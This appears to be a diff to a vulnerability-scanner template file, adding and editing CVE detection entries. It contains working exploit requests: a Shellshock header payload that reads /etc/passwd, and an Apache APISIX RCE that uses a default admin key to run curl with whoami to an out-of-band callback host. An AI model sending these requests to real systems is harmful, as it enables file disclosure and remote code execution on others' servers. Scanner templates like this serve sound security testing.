@@ -3277,9 +3277,9 @@
       "requests": [
         {
           "headers": {
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -14071,6 +14071,20 @@
       ]
     },
     {
+      "id": "CVE-2021-3293",
+      "info": {
+        "name": "Emlog 5.3.1 Path Disclosure",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET /t/index.php?action[]=aaaa HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-3297",
       "info": {
         "name": "Zyxel NBG2105 V1.00(AAGU.2)C0 - Authentication Bypass",
@@ -14789,7 +14803,7 @@
     {
       "id": "CVE-2021-40438",
       "info": {
-        "name": "Apache <= 2.4.48 - Mod_Proxy SSRF",
+        "name": "Apache <= 2.4.48 Mod_Proxy SSRF",
         "severity": "critical"
       },
       "requests": [
@@ -15638,6 +15652,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/plugin"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-24112",
+      "info": {
+        "name": "Apache APISIX apisix/batch-requests RCE",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /apisix/batch-requests HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\n\n{\n  \"headers\":{\n    \"X-Real-IP\":\"127.0.0.1\",\n    \"Content-Type\":\"application/json\"\n  },\n  \"timeout\":1500,\n  \"pipeline\":[\n    {\n      \"method\":\"PUT\",\n      \"path\":\"/apisix/admin/routes/index?api_key=edd1c9f034335f136f87ad84b625c8f1\",\n      \"body\":\"{\\r\\n \\\"name\\\": \\\"test\\\", \\\"method\\\": [\\\"GET\\\"],\\r\\n \\\"uri\\\": \\\"/api/{{randstr}}\\\",\\r\\n \\\"upstream\\\":{\\\"type\\\":\\\"roundrobin\\\",\\\"nodes\\\":{\\\"httpbin.org:80\\\":1}}\\r\\n,\\r\\n\\\"filter_func\\\": \\\"function(vars) os.execute('curl https://{{interactsh-url}}/`whoami`'); return true end\\\"}\"\n    }\n  ]\n}\n",
+            "GET /api/{{randstr}} HTTP/1.1\nHost: {{Hostname}}\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\n"
           ]
         }
       ]
